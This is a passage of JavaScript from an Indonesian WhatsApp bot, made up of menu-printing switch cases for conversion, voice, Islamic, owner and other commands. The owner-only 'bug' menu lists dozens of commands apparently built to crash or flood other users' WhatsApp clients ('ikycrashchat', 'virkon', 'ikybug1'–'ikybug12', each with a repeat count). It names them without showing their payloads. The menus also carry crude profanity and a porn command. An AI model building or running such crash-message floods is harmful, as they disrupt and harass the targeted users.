││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗𝚗𝚒𝚔𝚊𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚒𝚏𝚊𝚝𝚞𝚜𝚊𝚑𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚣𝚎𝚔𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚎𝚔𝚎𝚛𝚓𝚊𝚊𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚜𝚒𝚋
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚎𝚗𝚢𝚊𝚔𝚒𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚊𝚛𝚘𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚎𝚗𝚐𝚜𝚑𝚞𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚒𝚋𝚊𝚒𝚔
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚊𝚗𝚐𝚊𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚒𝚊𝚕
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚐𝚊𝚑𝚊𝚛𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚛𝚊𝚑𝚛𝚎𝚣𝚎𝚔𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚎𝚝𝚘𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚊𝚛𝚊𝚔𝚝𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚎𝚋𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚎𝚖𝚊𝚗𝚌𝚒𝚗𝚐
││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚜𝚊𝚜𝚞𝚋𝚞𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚣𝚘𝚍𝚒𝚊𝚔
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚑𝚒𝚘
╰─────────────────╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
 case 'convertmenu': { 
 anu = `
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
╭─────────────────╮
│◪〘 CONVERT MENU 〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚝𝚝𝚙
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚝𝚙
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚒𝚖𝚊𝚐𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚖𝚘𝚟𝚎𝚋𝚐
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚒𝚌𝚔𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡
││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡2
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚟𝚒𝚍𝚎𝚘
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚐𝚒𝚏
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚞𝚛𝚕
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚟𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚖𝚙3
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚊𝚞𝚍𝚒𝚘
││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚋𝚒𝚗𝚊𝚛𝚢
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚋𝚒𝚗𝚊𝚛𝚢
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚢𝚕𝚎𝚝𝚎𝚡𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚖𝚎𝚖𝚎
╰─────────────────╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
 case 'mainmenu': {
 anu = `
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
╭─────────────────╮
│   ◪〘 MAIN MENU 〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚒𝚗𝚐
││᭄⃟ꪶ⃟•╾ ${prefix}𝚘𝚠𝚗𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚎𝚗𝚞 / 𝚑𝚎𝚕𝚙 / ?
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚎𝚝𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚗𝚏𝚘𝚌𝚑𝚊𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚍
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚙𝚌
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚐𝚌
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚘𝚗𝚕𝚒𝚗𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚙𝚎𝚎𝚍𝚝𝚎𝚜𝚝
╰─────────────────╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
 case 'databasemenu': { 
 anu = `
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
╭─────────────────╮
│◪〘 DATABASE MENU 〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚌𝚖𝚍
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚌𝚖𝚍
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚌𝚖𝚍
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚘𝚌𝚔𝚌𝚖𝚍
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚍𝚍𝚖𝚜𝚐
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚖𝚜𝚐
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚎𝚝𝚖𝚜𝚐
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚖𝚜𝚐
╰─────────────────╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
 case 'anonymousmenu': { 
 anu = `
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
╭─────────────────╮
│ ◪〘 ANONYM MENU 〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚊𝚛𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚡𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚎𝚕𝚞𝚊𝚛
╰─────────────────╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
 case 'islamicmenu': {
 anu = `
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
╭─────────────────╮
│ ◪〘 ISLAMIC MENU 〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚚𝚛𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚍𝚒𝚜𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚕𝚚𝚞𝚛𝚊𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚞𝚣𝚊𝚖𝚖𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚊𝚏𝚜𝚒𝚛𝚜𝚞𝚛𝚊𝚑
╰─────────────────╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
 case 'voicemenu': {
 anu = `
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
╭─────────────────╮
│  ◪〘 VOICE MENU 〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚊𝚜𝚜
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚘𝚠𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚎𝚙
││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚊𝚛𝚛𝚊𝚙𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚜𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚒𝚐𝚑𝚝𝚌𝚘𝚛𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚟𝚎𝚛𝚜𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚘𝚋𝚘𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚕𝚘𝚠
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚞𝚙𝚊𝚒
╰─────────────────╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
 case 'ownermenu': {
 if (!isCreator && !isBan) return 
 anu = `
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
╭─────────────────╮
│ ◪〘 OWNER MENU 〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚊𝚌𝚝 [𝚎𝚖𝚘𝚓𝚒]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚑𝚊𝚝 [𝚘𝚙𝚝𝚒𝚘𝚗]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚘𝚒𝚗 [𝚕𝚒𝚗𝚔]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚎𝚊𝚟𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚞𝚗𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚌𝚐𝚛𝚘𝚞𝚙 [𝚝𝚎𝚡𝚝]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚌𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚋𝚘𝚝 [𝚒𝚖𝚊𝚐𝚎]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚎𝚡𝚒𝚏
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚖𝚎𝚗𝚞 [𝚘𝚙𝚝𝚒𝚘𝚗]
╰─────────────────╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
 case 'bugiky': { 
 if (!isCreator && !isBan) return
ikycoli.sendMessage(m.chat, {audio: fs.readFileSync('./src/iky1.mp3'), mimetype: 'audio/mpeg', ptt:true })
 anu = `
▇◤▔▔▔▔▔▔▔◥▇
▇▏◥▇◣┊◢▇◤▕▇
▇▏▃▆▅▎▅▆▃▕▇
▇▏╱▔▕▎▔▔╲▕▇
▇◣◣▃▅▎▅▃◢◢▇
▇▇◣◥▅▅▅◤◢▇▇
▇▇▇◣╲▇╱◢▇▇▇ 
╭─────────────────╮
│     ⸸‎〘 BUG IKY 〙⸸‎
│[🇮🇩]𝐇𝐀𝐈 𝐊𝐀𝐊 ${pushname}👋
│𝐈𝐍𝐈 𝐀𝐃𝐀𝐋𝐀𝐇 𝐁𝐎𝐓 𝐏𝐑𝐈𝐁𝐀𝐃𝐈 𝐈𝐊𝐘𝐘 𝐌𝐀𝐊𝐄𝐑𝐙⚡
│  𝐎𝐖𝐍𝐄𝐑  : ${ownername}
│𝐉𝐈𝐊𝐀 𝐀𝐃𝐀 𝐊𝐄𝐒𝐀𝐋𝐀𝐇𝐀𝐍 𝐇𝐔𝐁𝐔𝐍𝐆𝐈 𝐎𝐖𝐍𝐄𝐑 𝐊𝐀𝐌𝐈 𝐘𝐀𝐈𝐓𝐔 𝐈𝐊𝐘𝐘[🇮🇩]
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}💀 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}👽 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}☠️ [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}️👾 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🪐 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🦴 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}☝ [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🏻 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🦖 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🦕 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}👿 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🐉 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}⚡ [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}💥 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🔥 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🌪️ [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍂 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍃 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🌴 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🌿 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍀 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🪵 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🦥 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🌳 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍁 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🎋 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🥜 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🌰 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🥔 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🧄 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍆 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🥑 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🫑 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🥬 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🥒 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🥦 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🌽 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🧅 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍠 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🥕 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🌶️ [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍅 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🥥 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍇 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🫐 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🫒 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🥝 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍐 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍏 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍈 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍋 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍌 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍍 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🥭 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍊 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍑 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍉 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍎 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍒 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🍓 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🥀 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🐍 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🦂 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}🌷 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky1 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky2 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky3 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky4 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky5 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky6 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky7 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky8 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky9 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky10 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky11 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky12 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky13 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky14 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky15 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky16 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky17 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky18 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky19 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky20 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky21 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky22 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky23 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky24 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky25 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky26 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky27 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky28 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky29 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky30 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky31 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky32 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky33 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky34 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky35 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky36 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky37 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky38 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky39 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky40 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky41 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky42 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky43 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky44 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky45 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky46 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky47 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky48 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky49 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky50 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky51 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky52 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky53 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky54 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky55 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky56 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky57 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky58 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky59 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}Iky60 [ jumlah ]
││᭄⃟ꪶ⃟•╾ ${prefix}poll
││᭄⃟ꪶ⃟•╾ ${prefix}polliky
││᭄⃟ꪶ⃟•╾ ${prefix}polvot
││᭄⃟ꪶ⃟•╾ ${prefix}bokep
││᭄⃟ꪶ⃟•╾ ${prefix}ikysantet
││᭄⃟ꪶ⃟•╾ ${prefix}ikydocnopayment
││᭄⃟ꪶ⃟•╾ ${prefix}ikyinfinite
││᭄⃟ꪶ⃟•╾ ${prefix}ikycrashchat
││᭄⃟ꪶ⃟•╾ ${prefix}ikymakerzcrash
││᭄⃟ꪶ⃟•╾ ${prefix}ikycrashnopayment
││᭄⃟ꪶ⃟•╾ ${prefix}ikycrashpakepayment
││᭄⃟ꪶ⃟•╾ ${prefix}ikynomercy
││᭄⃟ꪶ⃟•╾ ${prefix}ikyselebew
││᭄⃟ꪶ⃟•╾ ${prefix}ikycrashemoji
││᭄⃟ꪶ⃟•╾ ${prefix}ikycrashtitik
││᭄⃟ꪶ⃟•╾ ${prefix}ikythemonster
││᭄⃟ꪶ⃟•╾ ${prefix}ikybug1 (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybug2 (jumlah) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikybug3 (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybug4 (jumlah) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikybug5 (jumlah) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikybug6 (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybug7 (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybug8 (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybug9 (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybug10 (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybug11 (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybug12 (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikyness (jumlah) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikydarkness (jumlah) 
││᭄⃟ꪶ⃟•╾ ${prefix}ngentids (jumlah) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikymakerztravazap (jumlah) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikymakerzcrashhuhu (jumlah) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikygans (jumlah) 
││᭄⃟ꪶ⃟•╾ ${prefix}kintil (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}peler (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}itzmeiky (jumlah) 
││᭄⃟ꪶ⃟•╾ ${prefix}pelerpakepayment (jumlah) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikypay (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikytroli (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}kontol (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}kuntul (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikydocu (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikyhello (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}virkon (jumlah) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikylokas (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}monyet (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikymomo (jumlah) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikybuggam (jumlah) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikybugpc (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybugvn (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikytroliv2 (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikyliveloc (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybuglist (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikytagcrash (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikycatalog (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybugstik (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}crashiky (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybutton (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybugloc (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybugdoc (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikylivelocv2 (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybuginvite (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybugstikv2 (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikycatalogv2 (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybugbutton (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybuttonygy (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikytengkorak (jumlah)
││᭄⃟ꪶ⃟•╾ ${prefix}ikyandroid (jumlah) 
